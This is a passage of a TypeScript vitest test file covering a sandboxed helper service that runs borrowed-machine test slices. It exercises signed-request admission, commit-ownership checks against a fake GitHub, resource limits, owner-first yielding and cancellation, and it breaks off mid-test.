// safe-fs-allow: test file — SafeFsExecutor used for tmpdir cleanup.
/**
 * Tier-1: the borrowed-machine helper service (docs/specs/local-verify-borrowed-unit-slices.md, B to E,
 * and what it accepts as amended by docs/specs/local-verify-borrowed-slices-count.md, C) on a
 * FakeSandboxDriver, fake GitHub, in-memory trees, scriptable owner load and a fixed clock. Nothing real runs.
 */
import { afterEach, describe, expect, it } from 'vitest';
import { SafeFsExecutor } from '../../../../src/core/SafeFsExecutor.js';
import { HELPER_LIMITS, parseHelperAnswer, verifyHelperAnswer, type HelperSliceAnswer } from '../../../../src/localVerify/helper/helperProtocol.js';
import { buildPerFile, readHelperPaused } from '../../../../src/localVerify/helper/HelperService.js';
import { outcomeDigest } from '../../../../src/localVerify/laneReport.js';
import { HEAD, UNIT_A, UNIT_B, UNIT_SCAN, UNIT_TMUX, helperRig, id32, machineKeys, memoryTreeHash, pins, sha, treeFiles, type HelperRig } from '../../../helpers/borrowedHelperFixture.js';
import { fakeManifest, vitestReport } from '../../../helpers/fakeSandboxDriver.js';
import { HelperDryRunStore } from '../../../../src/localVerify/helper/dryRunRecord.js';
import { HelperPackageIndex } from '../../../../src/localVerify/helper/packageCache.js';
import { installInputsHash } from '../../../../src/localVerify/installInputs.js';
import type { HeadVerdict } from '../../../../src/localVerify/helper/hostTree.js';

const dirs: string[] = [];
afterEach(() => { for (const d of dirs.splice(0)) SafeFsExecutor.safeRmSync(d, { recursive: true, force: true, operation: 'helperService.test.ts' }); });

const body = (a: { body: unknown }) => a.body as HelperSliceAnswer & { reason?: string; state: string };

describe('HelperService — admission', () => {
  it('answers 404 while disabled, and refuses through the tunnel', async () => {
    const r = helperRig({}, dirs);
    r.cfg.value = null;
    expect((await r.send(r.slice(), r.route)).status).toBe(404);
    const r2 = helperRig({}, dirs);
    const t = await r2.send(r2.slice(), { cfConnectingIp: '1.2.3.4', localAddress: '100.64.1.2' });
    expect(t.status).toBe(403);
    expect(body(t).reason).toBe('tunnel');
  });

  it('refuses unsigned, unpinned, expired and replayed requests, each with its reason', async () => {
    const r = helperRig({}, dirs);
    const unsigned = { ...r.slice() } as Record<string, unknown>;
    delete unsigned.sig;
    expect(body(await r.send(unsigned, r.route)).reason).toBe('unsigned');
    const stranger = machineKeys('m_stranger');
    expect(body(await r.send(r.slice({ requesterMachineId: 'm_stranger' }, stranger.signer), r.route)).reason).toBe('requester-not-pinned');
    expect(body(await r.send(r.slice({ expiresAt: r.clock.t - 31_000 }), r.route)).reason).toBe('expired');
    expect(r.audits.some((a) => a.event === 'helper-refused-expired')).toBe(true);
    const once = r.slice({ files: [], prepare: true });
    expect((await r.send(once, r.route)).status).toBe(202);
    expect(body(await r.send(once, r.route)).reason).toBe('replayed');
  });

  it('refuses a base commit that is not on main, one GitHub cannot confirm, and one GitHub limits, each with its reason', async () => {
    const r = helperRig({}, dirs);
    r.github.onMain.set(sha('e'), false);
    const notMerged = await r.send(r.slice({ headSha: sha('e'), files: [], prepare: true }), r.route);
    expect([notMerged.status, body(notMerged).reason]).toEqual([409, 'base-not-merged']);
    const unknown = await r.send(r.slice({ headSha: sha('f'), files: [], prepare: true }), r.route);
    expect([unknown.status, body(unknown).reason]).toEqual([503, 'merged-unknown']);
    r.github.onMain.set(sha('9'), 'rate-limited');
    const limited = await r.send(r.slice({ headSha: sha('9'), files: [], prepare: true }), r.route);
    expect([limited.status, body(limited).reason]).toEqual([503, 'merged-rate-limited']);
    // "Not on main" and "unknown" are asked again next time; only "merged" is remembered.
    r.github.onMain.set(sha('e'), true);
    r.trees.files[sha('e')] = { ...treeFiles(), COMMIT: 'e' };
    expect((await r.send(r.slice({ headSha: sha('e'), files: [], prepare: true }), r.route)).status).toBe(202);
    expect((await settled(r, sha('e'), sha('e'))).state).toBe('ready');
    expect(r.trees.fetched).toEqual([sha('e')]);
  });

  it('accepts every lane: a preparation for unit, integration and e2e is taken, and an unknown lane is malformed', async () => {
    const r = helperRig({}, dirs);
    for (const lane of ['unit', 'integration', 'e2e'] as const) {
      expect((await r.send(r.slice({ lane, files: [], prepare: true }), r.route)).status, lane).toBe(202);
    }
    expect(body(await r.send(r.slice({ lane: 'contract' as never, files: [], prepare: true }), r.route)).reason).toBe('invalid-request');
  });

  it('refuses files that are missing, of another lane, on the Mac-only list, or on the learned list (retrial bypasses at most 5); a scan hit no longer refuses', async () => {
    const r = helperRig({}, dirs);
    const run = id32();
    await r.prepareReady(run);
    const ask = async (files: string[], extra = {}) => body(await r.send(r.slice({ runAttemptId: run, files, ...extra }), r.route));
    expect((await ask(['tests/unit/nope.test.ts'])).reason).toBe('file-missing');
    r.trees.files[HEAD]['tests/integration/x.test.ts'] = "it('x', () => {});";
    expect((await ask(['tests/integration/x.test.ts'])).reason).toBe('file-wrong-lane');
    const excluded = await ask([UNIT_TMUX]);
    expect(excluded.reason).toBe('file-ineligible');
    // The word scan records and does not block (D, amended): a file that reads the home folder runs
    // like any other, and the helper itself records nothing about it (the run machine does).
    r.driver.slice = { exitCode: 0, resultText: vitestReport(r.driver.root, { [UNIT_SCAN]: ['passed'] }) };
    const scan = await ask([UNIT_SCAN]);
    expect(scan.state).toBe('done');
    expect(scan.perFile).toMatchObject([{ file: UNIT_SCAN, passed: 1, failed: 0 }]);
    expect(r.audits.some((a) => a.event === 'scan-hit')).toBe(false);
    // Learned list: the helper failing where the run machine passed, in two comparisons in a row, adds the file; then only a trial may name it.
    await r.svc.handleLearned(r.learned(id32(), [{ file: UNIT_A, kind: 'helper-failed-local-passed' }]), r.route);
    expect((await ask([UNIT_A])).state).toBe('done'); // one comparison is not enough
    await r.svc.handleLearned(r.learned(id32(), [{ file: UNIT_A, kind: 'helper-failed-local-passed' }]), r.route);
    expect((await ask([UNIT_A])).reason).toBe('file-ineligible');
    r.driver.slice = { exitCode: 0, resultText: vitestReport(r.driver.root, { [UNIT_A]: ['passed'] }) };
    expect((await ask([UNIT_A], { retrial: true })).state).toBe('done');
  });

  it('the check-slice fixtures may ride a unit request though they belong to no lane', async () => {
    const r = helperRig({}, dirs);
    const canary = 'tests/fixtures/borrowed-canary/canary-pass.test.ts';
    r.trees.files[HEAD][canary] = "it('c', () => {});";
    const run = id32();
    await r.prepareReady(run);
    r.driver.slice = { exitCode: 0, resultText: vitestReport(r.driver.root, { [canary]: ['passed', 'passed'] }) };
    const a = body(await r.send(r.slice({ runAttemptId: run, files: [canary], use: 'check' }), r.route));
    expect(a.state).toBe('done');
    // A fixture one folder deeper is not a check file, and not a unit file either.
    const deep = 'tests/fixtures/borrowed-canary/more/x.test.ts';
    r.trees.files[HEAD][deep] = "it('c', () => {});";
    expect(body(await r.send(r.slice({ runAttemptId: run, files: [deep], use: 'compare' }), r.route)).reason).toBe('file-wrong-lane');
    expect(body(await r.send(r.slice({ runAttemptId: run, files: [deep], use: 'check' }), r.route)).reason).toBe('check-not-fixture');
  });

  it('a check slice holds fixture files only: one real test file among them refuses check-not-fixture, and nothing runs', async () => {
    const r = helperRig({}, dirs);
    const canary = 'tests/fixtures/borrowed-canary/canary-pass.test.ts';
    r.trees.files[HEAD][canary] = "it('c', () => {});";
    const run = id32();
    await r.prepareReady(run);
    r.driver.calls = [];
    for (const files of [[UNIT_A], [canary, UNIT_A]]) {
      const a = await r.send(r.slice({ runAttemptId: run, files, use: 'check' }), r.route);
      expect([a.status, body(a).reason], files.join(',')).toEqual([409, 'check-not-fixture']);
    }
    expect(r.driver.calls.some((c) => c.startsWith('test:'))).toBe(false);
    // The other side: the same real file in a compare slice runs, and the fixture alone is a check slice.
    r.driver.slice = { exitCode: 0, resultText: vitestReport(r.driver.root, { [UNIT_A]: ['passed'] }) };
    expect(body(await r.send(r.slice({ runAttemptId: run, files: [UNIT_A], use: 'compare' }), r.route)).state).toBe('done');
    r.driver.slice = { exitCode: 0, resultText: vitestReport(r.driver.root, { [canary]: ['passed'] }) };
    expect(body(await r.send(r.slice({ runAttemptId: run, files: [canary], use: 'check' }), r.route)).state).toBe('done');
  });

  it('a slice arriving while another runs is queued and answered at once with its id, never refused as busy', async () => {
    const r = helperRig({}, dirs);
    const run = id32();
    await r.prepareReady(run);
    let release!: () => void;
    r.driver.slice = (files) => new Promise((res) => { release = () => res({ exitCode: 0, resultText: vitestReport(r.driver.root, { [files[0]]: ['passed'] }) }); });
    const firstReq = r.slice({ runAttemptId: run });
    const first = await r.svc.handleSlice(firstReq, r.route);
    expect([first.status, body(first).state, body(first).attemptId]).toEqual([202, 'queued', firstReq.attemptId]);
    await new Promise((res) => setTimeout(res, 20));
    const secondReq = r.slice({ runAttemptId: run, files: [UNIT_B] });
    const second = await r.svc.handleSlice(secondReq, r.route);
    expect([second.status, body(second).state, body(second).attemptId]).toEqual([202, 'queued', secondReq.attemptId]);
    // The queued answer is signed like any other and passes the run machine's strict parser.
    expect(verifyHelperAnswer(body(second), 'm_laptop', pins(r.helperKeys), r.clock.t)).toBeNull();
    expect(parseHelperAnswer(JSON.parse(JSON.stringify(body(second))))).not.toBeNull();
    expect((r.svc.status().queue as Array<{ attemptId: string }>).map((q) => q.attemptId)).toEqual([secondReq.attemptId]);
    release();
    expect((await r.svc.whenSliceAnswered(firstReq.attemptId))?.state).toBe('done');
    await new Promise((res) => setTimeout(res, 20));
    release();
    expect((await r.svc.whenSliceAnswered(secondReq.attemptId))?.state).toBe('done');
  });

  it('paused refuses new work; no signer or no sandbox refuses too', async () => {
    const r = helperRig({}, dirs);
    await r.svc.setPaused(true, 'test');
    expect(readHelperPaused(r.dir)).toBe(true);
    expect(body(await r.send(r.slice({ files: [], prepare: true }), r.route)).reason).toBe('paused');
    const n = helperRig({ signer: null }, dirs);
    expect(body(await n.send(n.slice({ files: [], prepare: true }), n.route)).reason).toBe('no-signer');
    const d = helperRig({ driver: null }, dirs);
    expect(body(await d.send(d.slice({ files: [], prepare: true }), d.route)).reason).toBe('no-sandbox');
  });
});

describe('HelperService — prepare and run', () => {
  it('prepares (fetch, merge, install from the merged commit, place, copy, build, seal, all under reaps), then runs a slice and answers signed per-file counts with the tree hash', async () => {
    const r = helperRig({}, dirs);
    const run = id32();
    await r.prepareReady(run);
    expect(r.trees.fetched).toEqual([HEAD]);
    const tree = memoryTreeHash(r.trees.files[HEAD]);
    expect(r.tree()?.treeHash).toBe(tree);
    const c = r.driver.calls;
    const at = (prefix: string) => c.findIndex((x) => x.startsWith(prefix));
    expect(c.indexOf('reap')).toBeLessThan(at('install:'));
    expect(at('install:')).toBeLessThan(at('place:'));
    expect(at('place:')).toBeLessThan(at(`copyIn:${tree}:placed`));
    expect(at(`copyIn:${tree}:placed`)).toBeLessThan(at('build:'));
    expect(at('build:')).toBeLessThan(at('seal:'));
    expect(c).toContain('checks');
    r.driver.slice = { exitCode: 1, resultText: vitestReport(r.driver.root, { [UNIT_A]: ['passed', 'failed'], [UNIT_B]: ['passed', 'skipped'] }), vitestStartMs: 900 };
    const req = r.slice({ runAttemptId: run, files: [UNIT_A, UNIT_B] });
    const a = body(await r.send(req, r.route));
    expect(a.state).toBe('done');
    expect(a.perFile).toEqual([
      { file: UNIT_A, tests: 2, passed: 1, failed: 1, skipped: 0, todo: 0, ms: 250, digest: outcomeDigest([{ name: 't0', outcome: 'passed' }, { name: 't1', outcome: 'failed' }]), failedTests: ['t1'] },
      { file: UNIT_B, tests: 2, passed: 1, failed: 0, skipped: 1, todo: 0, ms: 250, digest: outcomeDigest([{ name: 't0', outcome: 'passed' }, { name: 't1', outcome: 'skipped' }]), failedTests: [] },
    ]);
    // Protocol v2: the answer repeats the request's lane and commits and carries the hash of the tree the helper built and ran.
    expect(a).toMatchObject({ lane: 'unit', baseSha: HEAD, headSha: HEAD, treeHash: tree });
    expect(r.driver.calls).toContain(`test:${tree}:2`);
    // What the helper sends is what the run machine's strict parser accepts.
    expect(parseHelperAnswer(JSON.parse(JSON.stringify(a)))).not.toBeNull();
    expect(a.slice).toEqual({ exitCode: 1, unhandledErrors: 0, collected: true, vitestStartMs: 900 });
    expect(a.requestedFiles).toEqual([UNIT_A, UNIT_B]);
    expect(verifyHelperAnswer(a, 'm_laptop', pins(r.helperKeys), r.clock.t)).toBeNull();
    // Workers: min(cpus 8, 16 − reserve 4 − owner (2 − 0.5)) = 8, memory ceiling 8 GB → 8.
    expect(r.driver.lastWorkers).toBe(8);
    expect(r.driver.calls.filter((x) => x === 'reap').length).toBeGreaterThan(3);
  });

  it('a slice before the tree is ready is refused not-prepared; a file missing from the report is listed with zero tests (uncollected)', async () => {
    const r = helperRig({}, dirs);
    expect(body(await r.send(r.slice(), r.route)).reason).toBe('not-prepared');
    const run = id32();
    await r.prepareReady(run);
    r.driver.slice = { exitCode: 0, resultText: vitestReport(r.driver.root, { [UNIT_A]: ['passed'] }) };
    const a = body(await r.send(r.slice({ runAttemptId: run, files: [UNIT_A, UNIT_B] }), r.route));
    expect(a.perFile.find((p) => p.file === UNIT_B)).toEqual({ file: UNIT_B, tests: 0, passed: 0, failed: 0, skipped: 0, todo: 0, ms: 0, digest: null, failedTests: [] });
    expect(a.slice?.collected).toBe(false);
  });

  it('keeps at most 2 prepared trees, evicting the least recently used; a cancel that says the verify is over releases a run\'s tree', async () => {
    const r = helperRig({}, dirs);
    const runs = [id32(), id32(), id32()];
    await r.prepareReady(runs[0], HEAD);
    r.clock.t += 1000;
    await r.prepareReady(runs[1], sha('b'));
    r.clock.t += 1000;
    await r.prepareReady(runs[2], sha('c'));
    const heads = (r.svc.status().trees as Array<{ headSha: string }>).map((t) => t.headSha).sort();
    expect(heads).toEqual([sha('b'), sha('c')].sort());
    // Removed from the sandbox: the install tree (once: the three commits share one package list) and the evicted tree.
    expect(r.driver.removed).toContain(memoryTreeHash(r.trees.files[HEAD]));
    expect(r.driver.removed.length).toBe(2);
    expect(r.driver.calls.filter((x) => x.startsWith('install:')).length).toBe(1);
    expect(r.audits.some((a) => a.event === 'helper-tree-evicted' && a.headSha === HEAD)).toBe(true);
    const c = await r.svc.handleCancel(r.cancel(runs[2], { verifyOver: true }), r.route);
    expect((c.body as { removedTrees: string[] }).removedTrees).toEqual([sha('c')]);
  });

  it('refuses to prepare below the measured peak preparation size (disk-low) and without the host-disk margin (host-disk-low)', async () => {
    const r = helperRig({}, dirs);
    r.driver.freeBytes = 50 * 1024 ** 3;
    r.driver.freeBytesAfterPrep = 20 * 1024 ** 3; // the first preparation measures a 30 GB peak
    await r.prepareReady(id32(), HEAD);
    r.driver.freeBytes = 25 * 1024 ** 3;
    r.driver.freeBytesAfterPrep = null;
    await r.send(r.slice({ headSha: sha('b'), files: [], prepare: true }), r.route);
    await new Promise((res) => setTimeout(res, 30));
    expect((r.svc.status().trees as Array<{ headSha: string; reason?: string }>).find((t) => t.headSha === sha('b'))?.reason).toBe('disk-low');
    // Host disk: 30 GB cap − 1 GB used = 29 GB growth + 5 GB margin = 34 GB needed.
    const h = helperRig({}, dirs);
    h.hostFree.value = 33 * 1024 ** 3;
    await h.send(h.slice({ files: [], prepare: true }), h.route);
    await new Promise((res) => setTimeout(res, 30));
    expect((h.svc.status().trees as Array<{ reason?: string }>)[0]?.reason).toBe('host-disk-low');
  });

  it('a failed containment check recreates the sandbox and re-checks; still failing refuses helper-containment-unproven', async () => {
    const r = helperRig({}, dirs);
    const bad = { ok: false, checks: [{ name: 'config-no-mounts', result: 'fail' as const }], reason: 'config-no-mounts:fail' };
    r.driver.checksQueue = [bad, bad];
    await r.send(r.slice({ files: [], prepare: true }), r.route);
    await new Promise((res) => setTimeout(res, 30));
    expect(r.driver.calls).toContain('destroy');
    expect((r.svc.status().trees as Array<{ reason?: string }>)[0]?.reason).toBe('helper-containment-unproven');
    expect((r.svc.status().sandbox as { containment: { ok: boolean } }).containment.ok).toBe(false);
    // Recovered on the recreate: proceeds.
    const g = helperRig({}, dirs);
    g.driver.checksQueue = [bad];
    await g.prepareReady(id32());
  });

  it('clean-up kills at most 3 times 1 s apart, then restarts the sandbox', async () => {
    const r = helperRig({}, dirs);
    const run = id32();
    await r.prepareReady(run);
    r.driver.slice = { exitCode: 0, resultText: vitestReport(r.driver.root, { [UNIT_A]: ['passed'] }) };
    r.driver.reapSurvivors = [2, 1, 1];
    r.driver.calls = [];
    await r.send(r.slice({ runAttemptId: run }), r.route);
    expect(r.driver.calls.filter((x) => x === 'reap').length).toBe(3);
    expect(r.driver.calls.slice(-2)).toEqual(['stop', 'start']);
    expect(r.audits.some((a) => a.event === 'helper-reap-restart')).toBe(true);
  });

  it('a result over 4 MB is refused whole and counted result-oversize', async () => {
    const r = helperRig({}, dirs);
    const run = id32();
    await r.prepareReady(run);
    r.driver.slice = { exitCode: 0, oversize: { bytesSeen: 4 * 1024 * 1024 + 1 } };
    const a = body(await r.send(r.slice({ runAttemptId: run }), r.route));
    expect(a.resultOversize).toEqual({ bytesSeen: 4 * 1024 * 1024 + 1 });
    expect(a.perFile).toEqual([]);
    expect(r.audits.some((x) => x.event === 'result-oversize')).toBe(true);
  });
});

describe('HelperService — owner first', () => {
  it('memory pressure mid-slice stops at once, hands back with a measured handBackMs, stops the sandbox and holds off', async () => {
    const r = helperRig({}, dirs);
    const run = id32();
    await r.prepareReady(run);
    r.owner.count = 0;
    r.owner.after = { n: 2, sample: { ncpu: 16, hostBusyCores: 3, sandboxBusyCores: 1, memoryPressure: 'warn', onBattery: false } };
    r.driver.slice = (_f, signal) => new Promise((res) => signal.addEventListener('abort', () => { r.clock.t += 10; res({ exitCode: null, resultText: null }); }, { once: true }));
    const a = body(await r.send(r.slice({ runAttemptId: run }), r.route));
    expect(a.state).toBe('handed-back');
    expect(a.reason).toBe('memory-pressure');
    expect(a.handBackMs).toBe(10);
    expect(r.driver.running).toBe(false);
    expect(r.audits.some((x) => x.event === 'helper-sandbox-stop' && x.why === 'memory-pressure')).toBe(true);
    // Hold-off: owner-busy until memory has stayed normal for 5 min.
    r.owner.after = null;
    const b = body(await r.send(r.slice({ runAttemptId: run, files: [], prepare: true }), r.route));
    expect(b.state).toBe('owner-busy');
  });

  it('no spare cores (owner busy) answers owner-busy before running; battery stops unless stopOnBattery is off', async () => {
    const r = helperRig({}, dirs);
    const run = id32();
    await r.prepareReady(run);
    r.owner.sampleValue = { ncpu: 16, hostBusyCores: 13, sandboxBusyCores: 0, memoryPressure: 'normal', onBattery: false };
    const a = body(await r.send(r.slice({ runAttemptId: run }), r.route));
    expect(a.state).toBe('owner-busy');
    expect(a.reason).toBe('zero-workers');
    r.owner.sampleValue = { ncpu: 16, hostBusyCores: 1, sandboxBusyCores: 0, memoryPressure: 'normal', onBattery: true };
    expect(body(await r.send(r.slice({ runAttemptId: run }), r.route)).reason).toBe('battery');
  });

  it('pause stops current work at once; cancel stops it too', async () => {
    const r = helperRig({}, dirs);
    const run = id32();
    await r.prepareReady(run);
    r.driver.slice = (_f, signal) => new Promise((res) => signal.addEventListener('abort', () => res({ exitCode: null }), { once: true }));
    const p = r.send(r.slice({ runAttemptId: run }), r.route);
    await new Promise((res) => setTimeout(res, 10));
    await r.svc.setPaused(true, 'test');
    const a = body(await p);
    expect(a.state).toBe('handed-back');
    expect(a.reason).toBe('paused');
    await r.svc.setPaused(false, 'test');
    const q = r.send(r.slice({ runAttemptId: run }), r.route);
    await new Promise((res) => setTimeout(res, 10));
    await r.svc.handleCancel(r.cancel(run), r.route);
    expect(body(await q).state).toBe('cancelled');
  });

  it('a per-slice cancel stops only the named slice of its run and keeps the prepared tree; so does a whole-run cancel, until the verify is over', async () => {
    const r = helperRig({}, dirs);
    const run = id32();
    await r.prepareReady(run);
    r.driver.slice = (_f, signal) => new Promise((res) => signal.addEventListener('abort', () => res({ exitCode: null }), { once: true }));
    const trees = () => (r.svc.status().trees as Array<{ headSha: string; state: string }>).map((t) => [t.headSha, t.state]);
    const req = r.slice({ runAttemptId: run });
    const p = r.send(req, r.route);
    await new Promise((res) => setTimeout(res, 10));
    // Another slice's id, and the right id under another run: neither touches the running slice.
    const other = await r.svc.handleCancel(r.cancel(run, { attemptIds: [id32()] }), r.route);
    expect(other.body).toEqual({ cancelled: true, stopped: false, dequeued: 0, removedTrees: [] });
    const wrongRun = await r.svc.handleCancel(r.cancel(id32(), { attemptIds: [req.attemptId] }), r.route);
    expect(wrongRun.body).toEqual({ cancelled: true, stopped: false, dequeued: 0, removedTrees: [] });
    expect(r.svc.status().busy).toMatchObject({ kind: 'slice', attemptId: req.attemptId });
    // Its own id stops it, and the tree stays ready for the run's next slice.
    const hit = await r.svc.handleCancel(r.cancel(run, { attemptIds: [id32(), req.attemptId] }), r.route);
    expect(hit.body).toEqual({ cancelled: true, stopped: true, dequeued: 0, removedTrees: [] });
    expect(body(await p).state).toBe('cancelled');
    expect(trees()).toEqual([[HEAD, 'ready']]);
    expect(r.driver.removed).not.toContain(memoryTreeHash(r.trees.files[HEAD])); // only the install tree was ever removed
    // A whole-run cancel (no ids) no longer deletes the run's tree: the failing-direction request may still need it.
    const whole = await r.svc.handleCancel(r.cancel(run), r.route);
    expect((whole.body as { removedTrees: string[] }).removedTrees).toEqual([]);
    expect(trees()).toEqual([[HEAD, 'ready']]);
    expect(r.driver.removed).not.toContain(memoryTreeHash(r.trees.files[HEAD]));
    // "The verify is over" releases it.
    const over = await r.svc.handleCancel(r.cancel(run, { verifyOver: true }), r.route);
    expect((over.body as { removedTrees: string[] }).removedTrees).toEqual([HEAD]);
    expect(trees()).toEqual([]);
    expect(r.driver.removed).toContain(memoryTreeHash(r.trees.files[HEAD]));
  });

  it('the memory hold-off ends: idle samples while it holds, and normal memory for 5 min releases it', async () => {
    const r = helperRig({}, dirs);
    const run = id32();
    await r.prepareReady(run);
    r.owner.count = 0;
    r.owner.after = { n: 2, sample: { ncpu: 16, hostBusyCores: 3, sandboxBusyCores: 1, memoryPressure: 'warn', onBattery: false } };
    r.driver.slice = (_f, signal) => new Promise((res) => signal.addEventListener('abort', () => res({ exitCode: null }), { once: true }));
    expect(body(await r.send(r.slice({ runAttemptId: run }), r.route)).reason).toBe('memory-pressure');
    r.owner.after = null; // memory is back to normal
    expect(body(await r.send(r.slice({ files: [], prepare: true, headSha: sha('b') }), r.route)).state).toBe('owner-busy');
    r.clock.t += 5 * 60_000;
    await r.svc.sampleDuringHoldOff(); // the idle sampler's tick
    const after = await r.send(r.slice({ files: [], prepare: true, headSha: sha('b') }), r.route);
    expect(after.status).toBe(202);
    expect(body(after).state).toBe('preparing');
  });

  it('owner first: a preparation or a slice samples the owner BEFORE the sandbox boots', async () => {
    const r = helperRig({}, dirs);
    r.owner.sampleValue = { ncpu: 16, hostBusyCores: 1, sandboxBusyCores: 0, memoryPressure: 'normal', onBattery: true };
    await r.send(r.slice({ files: [], prepare: true }), r.route);
    await new Promise((res) => setTimeout(res, 30));
    expect((r.svc.status().trees as Array<{ reason?: string }>)[0]?.reason).toBe('owner-busy:battery');
    expect(r.driver.calls.filter((c) => c === 'start' || c === 'create')).toEqual([]);
    // A slice on a stopped sandbox (the owner paused and resumed): the battery answer comes without booting it.
    const g = helperRig({}, dirs);
    const run = id32();
    await g.prepareReady(run);
    await g.svc.setPaused(true, 'test');
    await g.svc.setPaused(false, 'test');
    expect(g.driver.running).toBe(false);
    g.driver.calls = [];
    g.owner.sampleValue = { ncpu: 16, hostBusyCores: 1, sandboxBusyCores: 0, memoryPressure: 'normal', onBattery: true };
    expect(body(await g.send(g.slice({ runAttemptId: run }), g.route)).reason).toBe('battery');
    expect(g.driver.calls).not.toContain('start');
  });

  it('a queued preparation is dropped by a pause, by a hold-off and by uninstall; it never boots the sandbox afterwards', async () => {
    for (const how of ['pause', 'pressure', 'uninstall'] as const) {
      const r = helperRig({}, dirs);
      const run = id32();
      await r.prepareReady(run);
      let release!: () => void;
      r.driver.slice = (_f, signal) => new Promise((res) => {
        release = () => res({ exitCode: 0, resultText: vitestReport(r.driver.root, { [UNIT_A]: ['passed'] }) });
        signal.addEventListener('abort', () => res({ exitCode: null }), { once: true });
      });
      const sl = r.send(r.slice({ runAttemptId: run }), r.route);
      await new Promise((res) => setTimeout(res, 10));
      expect((await r.send(r.slice({ files: [], prepare: true, headSha: sha('b') }), r.route)).status).toBe(202); // queued
      r.driver.calls = [];
      if (how === 'pause') await r.svc.setPaused(true, 'test');
      if (how === 'pressure') r.owner.after = { n: r.owner.count + 1, sample: { ncpu: 16, hostBusyCores: 3, sandboxBusyCores: 1, memoryPressure: 'warn', onBattery: false } };
      if (how === 'uninstall') { const u = r.svc.uninstall(); release(); await u; }
      await sl;
      await new Promise((res) => setTimeout(res, 40));
      expect(r.driver.calls.filter((c) => c.startsWith('copyIn') || c === 'create' || c === 'start'), how).toEqual([]);
    }
  });

  it('15 min without work stops the sandbox', async () => {
    const r = helperRig({}, dirs);
    await r.prepareReady(id32());
    expect(r.driver.running).toBe(true);
    r.clock.t += 14 * 60_000;
    await r.svc.tickIdle();
    expect(r.driver.running).toBe(true);
    r.clock.t += 61_000;
    await r.svc.tickIdle();
    expect(r.driver.running).toBe(false);
    expect(r.audits.some((a) => a.event === 'helper-sandbox-stop' && a.why === 'idle')).toBe(true);
  });
});

// ── What a helper accepts (amendment, C) ─────────────────────────────

/** A waiting change's head commit. */
const CHANGE = sha('1');
const PKG = (version: string, deps: Record<string, string> = { 'left-pad': '1.3.0' }) => JSON.stringify({ name: 'instar', version, dependencies: deps });
const LOCK = (version: string, pkgs: Record<string, unknown> = { 'node_modules/left-pad': { version: '1.3.0' } }) =>
  JSON.stringify({ name: 'instar', version, lockfileVersion: 3, packages: { '': { name: 'instar', version }, ...pkgs } });
const hashOf = (files: Record<string, string>): string => {
  const h = installInputsHash({ packageJson: files['package.json'] ?? null, packageLock: files['package-lock.json'] ?? null, npmrc: files['.npmrc'] ?? null,
    stepFiles: Object.entries(files).filter(([p]) => p.startsWith('.husky/') || p.startsWith('scripts/')).map(([path, content]) => ({ path, content })) });
  if (!h.ok) throw new Error(h.refusal);
  return h.hash;
};

/** Put a waiting change in the fake repository: its own commit, and (optionally) what its merge with HEAD gives. */
function change(r: HelperRig, o: { merge?: Record<string, string> | 'conflict'; verdict?: HeadVerdict; edit?: Record<string, string> } = {}): Record<string, string> {
  const files = { ...r.trees.files[HEAD], 'src/x.ts': 'export const x = 2;\n', ...(o.edit ?? {}) };
  r.trees.files[CHANGE] = files;
  if (o.merge) r.trees.merges[`${HEAD}:${CHANGE}`] = o.merge;
  r.github.heads.set(CHANGE, o.verdict ?? 'ours');
  return files;
}
const askChange = (r: HelperRig, over: Record<string, unknown> = {}) => r.send(r.slice({ baseSha: HEAD, headSha: CHANGE, files: [], prepare: true, ...over }), r.route);
async function settled(r: HelperRig, head = CHANGE, base = HEAD) {
  for (let i = 0; i < 300; i++) {
    const t = r.tree(head, base);
    if (t && t.state !== 'preparing') return t;
    await new Promise((res) => setTimeout(res, 2));
  }
  throw new Error('preparation never settled');
}

describe('HelperService — whose code runs (C items 1 and 2)', () => {
  it('a merged commit as base and head is accepted without asking for a pull request; an own open head is accepted and merged with its base', async () => {
    const r = helperRig({}, dirs);
    expect((await r.send(r.slice({ files: [], prepare: true }), r.route)).status).toBe(202);
    expect(r.github.headCalls).toBe(0);
    await settled(r, HEAD, HEAD);
    // The other side: our own branch's open head, after the dry run.
    r.dryRunDone();
    const files = change(r);
    const a = await askChange(r);
    expect(a.status).toBe(202);
    expect(r.github.headCalls).toBe(1);
    expect((await settled(r)).state).toBe('ready');
    expect(r.trees.fetched.slice(-2)).toEqual([HEAD, CHANGE]);
    expect(r.tree(CHANGE, HEAD)?.treeHash).toBe(memoryTreeHash(files));
  });

  it.each([
    ['fork', 'head-fork', 409], ['closed', 'head-pr-closed', 409], ['moved', 'head-moved', 409], ['no-head-repo', 'head-repo-missing', 409],
    ['not-listed', 'head-not-ours', 409], ['unreachable', 'head-unknown', 503], ['rate-limited', 'head-rate-limited', 503],
  ] as Array<[HeadVerdict, string, number]>)('a head GitHub reports as %s is refused %s, before anything is fetched or run', async (verdict, reason, status) => {
    const r = helperRig({}, dirs);
    r.dryRunDone(); // so the only thing wrong is the head
    change(r, { verdict });
    const a = await askChange(r);
    expect([a.status, body(a).reason]).toEqual([status, reason]);
    expect(body(a).state).toBe('refused');
    expect(r.trees.fetched).toEqual([]);
    expect(r.driver.calls).toEqual([]);
    expect(r.svc.status().lastRefusal).toMatchObject({ reason });
    // A slice (not only a preparation) is refused the same way.
    expect(body(await askChange(r, { files: [UNIT_A], prepare: undefined, use: 'compare' })).reason).toBe(reason);
  });

  it('a throwing GitHub reader refuses head-unknown; the base is checked first, the head second, the dry run third', async () => {
    const r = helperRig({}, dirs);
    change(r);
    // Base not merged: the head is never asked about.
    r.github.onMain.set(sha('e'), false);
    expect(body(await askChange(r, { baseSha: sha('e') })).reason).toBe('base-not-merged');
    expect(r.github.headCalls).toBe(0);
    // Head not ours and no dry run either: the head's reason comes first.
    r.github.heads.set(CHANGE, 'fork');
    expect(body(await askChange(r)).reason).toBe('head-fork');
    // Head ours, no dry run: the dry run's reason, after GitHub was asked.
    r.github.heads.set(CHANGE, 'ours');
    expect(body(await askChange(r)).reason).toBe('dry-run-not-done');
    expect(r.github.headCalls).toBe(2);
    r.github.ownOpenHead = async () => { throw new Error('socket hang up'); };
    const a = await askChange(r);
    expect([a.status, body(a).reason]).toEqual([503, 'head-unknown']);
  });

  it('an accepted head is remembered for the same run only: a head that moved is refused on the next run', async () => {
    const r = helperRig({}, dirs);
    r.dryRunDone();
    change(r);
    const run = id32();
    expect((await askChange(r, { runAttemptId: run })).status).toBe(202);
    await settled(r);
    expect((await askChange(r, { runAttemptId: run })).status).toBe(202);
    expect(r.github.headCalls).toBe(1);
    r.github.heads.set(CHANGE, 'moved');
    const next = await askChange(r, { runAttemptId: id32() });
    expect(body(next).reason).toBe('head-moved');
